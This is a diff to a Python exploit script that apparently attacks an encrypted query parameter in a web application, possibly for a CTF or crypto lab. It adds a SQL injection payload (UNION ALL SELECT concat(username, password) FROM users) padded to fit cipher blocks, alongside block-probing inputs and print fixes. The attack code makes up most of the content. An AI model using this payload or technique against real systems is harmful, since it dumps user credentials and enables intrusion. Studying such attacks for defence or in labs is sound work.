@@ -93,20 +93,20 @@ def xor_guess_and_guessed_bytes(g, ind, pad_prev_block, guessed_block):
 
 
 def print_hex(string):
-    print(string)
     base = 32
     for i in range (len(string)//32):
         if i%2 == 0:
-            print(bcolors.OKBLUE + string[base*i:base*(i+1)] + bcolors.ENDC,)
+            print(bcolors.OKBLUE + string[base*i:base*(i+1)] + bcolors.ENDC, end='')
         else:
-            print(bcolors.OKGREEN + string[base*i:base*(i+1)] + bcolors.ENDC,)
-    print
+            print(bcolors.OKGREEN + string[base*i:base*(i+1)] + bcolors.ENDC, end='')
+    print('\n\n')
 
 #input_list = ["A", "AA", "AAA", "AAAA", "AAAAA", "AAAAAA", "AAAAAAA",\
 #"AAAAAAAA", "AAAAAAAAA", "AAAAAAAAAA", "AAAAAAAAAAA", "AAAAAAAAAAAA", "AAAAAAAAAAAAA", "AAAAAAAAAAAAAA", \
 #"AAAAAAAAAAAAAAAAAAAAAAAA", "BBBBBBAAAAAAAAAAAAAAAAAAA", "BBBBBBBBBBAAAAAAAAAAAA", "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"]
+new_sql = " UNION ALL SELECT concat(username,0x3A,password) FROM users #"
 
-input_list = ["", "&", "%26", "a", "b", "'", "%27", "BBBBBBBBBBAAAAAAAAAAAAA", "BBBBBBBBBBAAAAAAAAAAAAAA", "BBBBBBBBBAAAAAAAAAAAAAAAA", "BBBBBBBBBBAAAAAAAAAAAAAAAAAAA", "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"]
+input_list = ["", "&", "%26", "a", "b", "'", "%27", "A"*9, "A"*10, "A"*10 + "B"*14, "A"*10 + new_sql + "B"*(16-len(new_sql)%16), "A"*11, "A"*12, "A"*13]
 
 
 for query in input_list:
@@ -116,8 +116,6 @@ for query in input_list:
     equal_sign_pos = loc_header.find('=') + 1
     print(urllib.parse.unquote(loc_header[equal_sign_pos:])) # print URL-decoded query parameter
     ans_hex = decode_answer(loc_header[equal_sign_pos:])
-    print(ans_hex)
-    #print ans_hex
     print_hex(ans_hex)
     #print divide_block_to_bytes(ans_hex)
 
